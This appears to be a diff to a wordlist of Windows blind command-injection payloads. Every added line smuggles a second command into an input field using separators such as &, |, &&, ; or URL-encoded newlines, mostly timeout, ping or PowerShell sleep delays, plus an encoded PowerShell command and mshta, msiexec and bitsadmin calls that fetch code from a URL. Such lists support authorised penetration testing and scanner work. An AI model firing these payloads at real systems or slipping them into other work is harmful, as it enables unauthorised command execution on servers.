@@ -1,6 +1,54 @@
-;ping -n 6 127.0.0.1
-&ping -n 6 127.0.0.1
-|ping -n 6 127.0.0.1
-||ping -n 6 127.0.0.1
-;timeout /T 5 /NOBREAK
-;powershell -c "Start-Sleep -s 5"
+& timeout /t 5
+& timeout /t 10
+& timeout /t 30
+& ping -n 5 127.0.0.1
+& ping -n 10 127.0.0.1
+& ping -n 15 127.0.0.1
+& ping -n 30 127.0.0.1
+& ping -n 5 -w 1000 127.0.0.1
+| timeout /t 5
+| ping -n 5 127.0.0.1
+&& timeout /t 5
+&& ping -n 5 127.0.0.1
+|| timeout /t 5
+|| ping -n 5 127.0.0.1
+; timeout /t 5
+; ping -n 5 127.0.0.1
+& powershell -c "Start-Sleep 5"
+& powershell -c "Start-Sleep 10"
+& powershell -c "Start-Sleep 30"
+| powershell -c "Start-Sleep 5"
+&& powershell -c "Start-Sleep 5"
+; powershell -c "Start-Sleep 5"
+& powershell -c "[System.Threading.Thread]::Sleep(5000)"
+& powershell -c "[System.Threading.Thread]::Sleep(10000)"
+& w32tm /query /status > /dev/null & timeout /t 5
+& cmd /c timeout /t 5
+& cmd.exe /c timeout /t 5
+& cmd /c ping -n 5 127.0.0.1
+& cmd.exe /c ping -n 5 127.0.0.1
+%26 timeout /t 5
+%26 ping -n 5 127.0.0.1
+%26%26 timeout /t 5
+%7c timeout /t 5
+%0d%0atimeout /t 5
+%0atimeout /t 5
+
+timeout /t 5
+
+timeout /t 5
+& powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAANQA=
+& certutil -ping 127.0.0.1 & timeout /t 5
+& net view 127.0.0.1 & timeout /t 5
+& nslookup 127.0.0.1 & timeout /t 5
+& tracert -h 1 127.0.0.1 & timeout /t 5
+& mshta http://127.0.0.1/ & timeout /t 5
+& cscript //nologo //e:vbscript //b script.vbs & timeout /t 5
+& wscript //nologo //e:vbscript //b script.vbs & timeout /t 5
+& msiexec /q /i http://127.0.0.1/test.msi & timeout /t 5
+& bitsadmin /transfer x http://127.0.0.1/x C:\x & timeout /t 5
+& ping /n 5 127.0.0.1
+& ping /n 10 127.0.0.1
+& timeout 5
+& wait 5
+& sleep 5
